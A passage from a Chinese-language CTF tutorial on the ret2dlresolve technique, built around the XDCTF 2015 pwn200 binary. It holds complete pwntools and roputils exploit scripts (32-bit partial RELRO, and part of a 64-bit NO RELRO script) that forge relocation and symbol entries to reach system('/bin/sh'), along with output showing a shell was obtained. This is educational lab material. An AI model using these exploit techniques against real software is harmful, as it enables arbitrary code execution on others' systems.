rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

<span class="token comment" spellcheck="true"># make a fake write symbol at base_stage + 32 + align</span>
fake_sym_addr <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">32</span>
align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># since the size of Elf32_Symbol is 0x10</span>
fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align
index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x10</span>  <span class="token comment" spellcheck="true"># calculate the dynsym index of write</span>
st_name <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">-</span> dynstr         <span class="token comment" spellcheck="true"># plus 10 since the size of Elf32_Sym is 16.</span>
fake_write_sym <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>st_name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># make fake write relocation at base_stage+24</span>
index_offset <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">-</span> rel_plt
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span> <span class="token comment" spellcheck="true"># calculate the r_info according to the index of write</span>
fake_write_reloc <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>write_got<span class="token punctuation">,</span> r_info<span class="token punctuation">]</span><span class="token punctuation">)</span>

gnu_version_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.gnu.version'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ndx_addr: %s"</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>gnu_version_addr<span class="token operator">+</span>index_dynsym<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># construct ropchain</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake ret addr of write</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">82</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_reloc<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># fake write reloc</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> align<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_sym<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># fake write symbol</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'system\x00'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># there must be a \x00 to mark the end of string</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>sh <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要注意的是，这里我把 /bin/sh 的偏移修改为了 base_stage+82，这是因为 pwntools 会对齐字符串。如下面的 ropchain 所示，0x40 处多了两个 a，比较奇怪。</p>
<pre><code>0x0038:           'syst' 'system\x00'
0x003c:        'em\x00o'
0x0040:             'aa'
0x0042:           'aaaa' 'aaaaaaaaaaaaaa'</code></pre><p>效果如下</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python stage6.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 28204
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
0x0000:        0x8048370
0x0004:           0x25ec
0x0008:           'bbbb' 'bbbb'
0x000c:        0x804a94a
0x0010:           'bbbb' 'bbbb'
0x0014:           'bbbb' 'bbbb'
0x0018: '\x1c\xa0\x04\x08' '\x1c\xa0\x04\x08\x07u\x02\x00'
0x001c:  '\x07u\x02\x00'
0x0020:           'aaaa' 'aaaa'
0x0024:  '\xc0&\x00\x00' '\xc0&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
0x0028: '\x00\x00\x00\x00'
0x002c: '\x00\x00\x00\x00'
0x0030: '\x12\x00\x00\x00'
0x0034:           'syst' 'system\x00'
0x0038:        'em\x00n'
0x003c:             'aa'
0x003e:           'aaaa' 'aaaaaaaaaaaaaaaaaa'
0x0042:           'aaaa'
0x0046:           'aaaa'
0x004a:           'aaaa'
0x004e:           'aaaa'
0x0052:           '/bin' '/bin/sh\x00'
0x0056:        '/sh\x00'
0x005a:           'aaaa' 'aaaaaaaaaa'
0x005e:           'aaaa'
0x0062:           'aaaa'
102
[*] Switching to interactive mode
/bin/sh: 1: aa: not found
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="基于工具伪造"><a href="#基于工具伪造" class="headerlink" title="基于工具伪造"></a>基于工具伪造</h4><p>根据上面的介绍，我们应该可以理解这个攻击了。</p>
<h5 id="Roputil"><a href="#Roputil" class="headerlink" title="Roputil"></a>Roputil</h5><p>下面我们直接使用 roputil 来进行攻击。代码如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> roputils <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> process
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> gdb
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> context
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">112</span>
bss_base <span class="token operator">=</span> rop<span class="token punctuation">.</span>section<span class="token punctuation">(</span><span class="token string">'.bss'</span><span class="token punctuation">)</span>
buf <span class="token operator">=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>

buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bss_base<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">## used to call dl_runtimeresolve()</span>
buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_call<span class="token punctuation">(</span>bss_base <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">,</span> bss_base<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>

buf <span class="token operator">=</span> rop<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">## used to make faking data, such relocation, Symbol, Str</span>
buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_data<span class="token punctuation">(</span>bss_base <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">)</span>
buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>关于 dl_resolve_call 与 dl_resolve_data 的具体细节请参考 roputils.py 的源码，比较容易理解。需要注意的是，dl_resolve 执行完之后也是需要有对应的返回地址的。</p>
<p>效果如下</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python roptool.py
[+] Starting local process './main_partial_relro_32': pid 24673
[DEBUG] Received 0x17 bytes:
    'Welcome to XDCTF2015~!\n'
[DEBUG] Sent 0x94 bytes:
    00000000  42 6a 63 57  32 34 75 7a  30 64 6d 71  45 54 50 31  │BjcW│24uz│0dmq│ETP1│
    00000010  42 63 4b 61  4c 76 5a 35  38 77 79 6d  4c 62 34 74  │BcKa│LvZ5│8wym│Lb4t│
    00000020  56 47 4c 57  62 67 55 4b  65 57 4c 64  34 62 6f 47  │VGLW│bgUK│eWLd│4boG│
    00000030  43 47 59 65  4f 41 73 4c  61 35 79 4f  56 47 51 71  │CGYe│OAsL│a5yO│VGQq│
    00000040  59 53 47 69  6e 68 62 35  6f 33 4a 6e  31 77 66 68  │YSGi│nhb5│o3Jn│1wfh│
    00000050  45 6f 38 6b  61 46 46 38  4f 67 6c 62  61 41 58 47  │Eo8k│aFF8│Oglb│aAXG│
    00000060  66 7a 4b 30  63 6d 43 43  74 73 4d 7a  52 66 58 63  │fzK0│cmCC│tsMz│RfXc│
    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│
    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│
    00000090  40 a0 04 08                                         │@···│
    00000094
[DEBUG] Sent 0x64 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  35 45 4e 50  6e 51 51 4b  │/bin│/sh·│5ENP│nQQK│
    00000010  74 30 57 47  62 55 49 54  54 a0 04 08  07 e9 01 00  │t0WG│bUIT│T···│····│
    00000020  6c 30 39 79  68 4c 58 4b  00 1e 00 00  00 00 00 00  │l09y│hLXK│····│····│
    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 7a  │····│····│syst│em·z│
    00000040  32 45 74 78  75 35 59 6a  55 6b 54 74  63 46 70 71  │2Etx│u5Yj│UkTt│cFpq│
    00000050  32 42 6f 4c  43 53 49 33  75 47 59 53  7a 76 63 6b  │2BoL│CSI3│uGYS│zvck│
    00000060  44 43 4d 41                                         │DCMA│
    00000064
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x9f bytes:
    'exp-pwntools.py        roptool.py    stage2.py\tstage5.py\n'
    'ld-linux.so.2\t       roputils.pyc  stage3.py\tstage6.py\n'
    'main_partial_relro_32  stage1.py     stage4.py\n'
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h5><p>这里我们使用 pwntools 的工具进行攻击。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>context<span class="token punctuation">.</span>binary<span class="token punctuation">)</span>
dlresolve <span class="token operator">=</span> Ret2dlresolvePayload<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>symbol<span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># pwntools will help us choose a proper addr</span>
<span class="token comment" spellcheck="true"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>dlresolve<span class="token punctuation">.</span>data_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>ret2dlresolve<span class="token punctuation">(</span>dlresolve<span class="token punctuation">)</span>
raw_rop <span class="token operator">=</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Welcome to XDCTF2015~!\n"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token number">112</span><span class="token punctuation">:</span>raw_rop<span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">:</span>dlresolve<span class="token punctuation">.</span>payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python exp-pwntools.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[+] Starting local process './main_partial_relro_32': pid 24688
[*] Switching to interactive mode
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><p>在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。</p>
<p>那有没有什么办法可以绕过这样的防护呢？请读者自己思考。</p>
<h2 id="64-位例子"><a href="#64-位例子" class="headerlink" title="64 位例子"></a>64 位例子</h2><h3 id="NO-RELRO-1"><a href="#NO-RELRO-1" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。</p>
<ol>
<li>在 bss 段伪造栈。栈中的数据为<ol>
<li>修改 .dynamic 节中字符串表的地址为伪造的地址</li>
<li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li>
<li>在特定的位置读取 /bin/sh 字符串。</li>
<li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而触发执行 system 函数。</li>
</ol>
</li>
<li>栈迁移到 bss 段。</li>
</ol>
<p>由于程序中没有直接设置 rdx 的 gadget，所以我们这里就选择了万能 gadget。这会使得我们的 ROP 链变得更长</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
<span class="token comment" spellcheck="true"># context.terminal = ["tmux","splitw","-h"]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400750</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40076A</span>
leave_ret  <span class="token operator">=</span><span class="token number">0x40063c</span>
poprbp_ret <span class="token operator">=</span> <span class="token number">0x400588</span>
<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set rsp = new_stack</span>
stack_size <span class="token operator">=</span> <span class="token number">0x200</span> <span class="token comment" spellcheck="true"># new stack size is 0x200</span>
new_stack <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x100</span>

offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
payload1 <span class="token operator">=</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>new_stack<span class="token punctuation">,</span>stack_size<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400607</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># construct fake stack</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600988</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># modify .dynstr pointer in .dynamic section to a specific location</span>
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>
dynstr <span class="token operator">=</span> dynstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600B30</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># construct a fake dynstr section</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600B30</span><span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># read /bin/sh\x00</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x0000000000400773</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rdi; ret</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x600B30</span><span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400516</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># the second instruction of read@plt </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>stack_size<span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># reuse the vuln to stack pivot</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
